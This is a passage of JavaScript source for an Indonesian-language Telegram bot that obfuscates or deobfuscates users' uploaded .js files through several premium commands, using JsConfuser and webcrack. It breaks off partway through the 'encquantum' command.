            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Stealth) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Stealth obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Stealth yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Stealth Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getStealthObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Stealth: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `stealth-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Stealth) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Stealth Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Stealth obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("customenc", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Ambil nama kustom dari perintah
    const args = ctx.message.text.split(" ");
    if (args.length < 2 || !args[1]) {
        return ctx.replyWithMarkdown("❌ *Error:* Gunakan format `/customenc <nama>` dengan nama kustom!");
    }
    const customName = args[1].replace(/[^a-zA-Z0-9_]/g, ""); // Sanitasi input, hanya huruf, angka, dan underscore
    if (!customName) {
        return ctx.replyWithMarkdown("❌ *Error:* Nama kustom harus berisi huruf, angka, atau underscore!");
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/customenc <nama>`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `custom-${customName}-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Custom: ${customName}) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Custom obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Custom (${customName}) yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Custom Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getCustomObfuscationConfig(customName));
        log(`Hasil obfuscation (50 char pertama): ${obfuscated.code.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi kode hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            log(`Kode hasil obfuscation tidak valid: ${postObfuscationError.message}`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Mengirim file terenkripsi gaya Custom: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `custom-${customName}-encrypted-${file.file_name}` },
            { caption: `✅ *File terenkripsi (Hardened Custom: ${customName}) siap!*\nEncryption Success 🕊`, parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, `Hardened Custom (${customName}) Obfuscation Selesai`);

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Custom obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /deobfuscate (diperbaiki untuk menangani Promise dan validasi)
bot.command("deobfuscate", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js yang diobfuscate dengan `/deobfuscate`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const deobfuscatedPath = path.join(__dirname, `deobfuscated-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai Deobfuscation (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Decryption"
        );

        // Mengunduh file
        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk deobfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        // Validasi kode awal
        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode Awal");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        // Proses deobfuscation dengan webcrack
        log(`Memulai deobfuscation dengan webcrack: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 40, "Memulai Deobfuscation");
        const result = await webcrack(fileContent); // Pastikan await digunakan
        let deobfuscatedCode = result.code;

        // Penanganan jika kode dibundel
        let bundleInfo = "";
        if (result.bundle) {
            bundleInfo = "// Detected as bundled code (e.g., Webpack/Browserify)\n";
            log(`Kode terdeteksi sebagai bundel: ${file.file_name}`);
        }

        // Jika tidak ada perubahan signifikan atau hasil bukan string
        if (!deobfuscatedCode || typeof deobfuscatedCode !== "string" || deobfuscatedCode.trim() === fileContent.trim()) {
            log(`Webcrack tidak dapat mendekode lebih lanjut atau hasil bukan string: ${file.file_name}`);
            deobfuscatedCode = `${bundleInfo}// Webcrack tidak dapat mendekode sepenuhnya atau hasil invalid\n${fileContent}`;
        }

        // Validasi kode hasil
        log(`Memvalidasi kode hasil deobfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 60, "Memvalidasi Kode Hasil");
        let isValid = true;
        try {
            new Function(deobfuscatedCode);
            log(`Kode hasil valid: ${deobfuscatedCode.substring(0, 50)}...`);
        } catch (syntaxError) {
            log(`Kode hasil tidak valid: ${syntaxError.message}`);
            deobfuscatedCode = `${bundleInfo}// Kesalahan validasi: ${syntaxError.message}\n${deobfuscatedCode}`;
            isValid = false;
        }

        // Simpan hasil
        await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");
        await fs.writeFile(deobfuscatedPath, deobfuscatedCode);

        // Kirim hasil
        log(`Mengirim file hasil deobfuscation: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: deobfuscatedPath, filename: `deobfuscated-${file.file_name}` },
            { caption: `✅ *File berhasil dideobfuscate!${isValid ? "" : " (Perhatikan pesan error dalam file)"}*\nEncryption Success 🕊`, parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Deobfuscation Selesai");

        // Hapus file sementara
        if (await fs.pathExists(deobfuscatedPath)) {
            await fs.unlink(deobfuscatedPath);
            log(`File sementara dihapus: ${deobfuscatedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat deobfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan file Javascript yang valid!_`);
        if (await fs.pathExists(deobfuscatedPath)) {
            await fs.unlink(deobfuscatedPath);
            log(`File sementara dihapus setelah error: ${deobfuscatedPath}`);
        }
    }
});

// Command /encstrong (Obfuscation baru dengan metode Strong)
bot.command("encstrong", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encstrong`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `strong-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Strong) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Strong obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Strong`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Strong Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getStrongObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated; // Pastikan string
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Strong: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `strong-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Strong) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Strong Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Strong obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});


// Command /encbig <size_in_mb> (Obfuscation dengan ukuran besar)
bot.command("encbig", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Ambil target ukuran dari perintah
    const args = ctx.message.text.split(" ");
    if (args.length < 2 || !args[1] || isNaN(args[1])) {
        return ctx.replyWithMarkdown("❌ *Error:* Gunakan format `/encbig <size_in_mb>` dengan ukuran dalam MB (angka)!");
    }
    const targetSizeMB = Math.max(1, parseInt(args[1], 10)); // Minimal 1 MB

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encbig <size_in_mb>`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `big-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Big: ${targetSizeMB}MB) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Big obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Big`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Big Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getBigObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated; // Pastikan string
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        // Tambahkan padding secara manual untuk meningkatkan ukuran
        const currentSizeBytes = Buffer.byteLength(obfuscatedCode, "utf8");
        const targetSizeBytes = targetSizeMB * 1024 * 1024; // Konversi MB ke bytes
        if (currentSizeBytes < targetSizeBytes) {
            const paddingSize = targetSizeBytes - currentSizeBytes;
            const padding = crypto.randomBytes(paddingSize).toString("base64");
            obfuscatedCode += `\n/* Binary Padding (${paddingSize} bytes) */\n// ${padding}`;
            log(`Padding ditambahkan: ${paddingSize} bytes`);
        }

        log(`Memvalidasi hasil obfuscation dengan padding: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid setelah padding: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Big: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `big-encrypted-${file.file_name}` },
            { caption: `✅ *File terenkripsi (Hardened Big: ${targetSizeMB}MB) siap!*\nEncryption Success 🕊`, parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, `Hardened Big (${targetSizeMB}MB) Obfuscation Selesai`);

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Big obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});



// Command /encultra (Obfuscation baru dengan metode Ultra)
bot.command("encultra", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encultra`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `ultra-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Ultra) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Ultra obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Ultra`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Ultra Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getUltraObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated; // Pastikan string
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Ultra: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `ultra-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Ultra) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Ultra Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Ultra obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encmax <intensity> (Obfuscation dengan metode Max dan intensitas yang dapat diatur)
bot.command("encmax", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Ambil intensitas dari perintah
    const args = ctx.message.text.split(" ");
    if (args.length < 2 || !args[1] || isNaN(args[1])) {
        return ctx.replyWithMarkdown("❌ *Error:* Gunakan format `/encmax <intensity>` dengan intensitas (1-10)!");
    }
    const intensity = Math.min(Math.max(1, parseInt(args[1], 10)), 10); // Batas 1-10

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encmax <intensity>`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `max-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Max Intensity ${intensity}) (1%)\n` +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Max obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Max (Intensity ${intensity})`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Max Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getMaxObfuscationConfig(intensity));
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Max: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `max-encrypted-${file.file_name}` },
            { caption: `✅ *File terenkripsi (Hardened Max, Intensity ${intensity})*\nEncryption Success 🕊`, parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, `Hardened Max (Intensity ${intensity}) Obfuscation Selesai`);

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Max obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encquantum", async (ctx) => {
    users.add(ctx.from.id);
    saveUsers(users);

    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encquantum`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `quantum-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
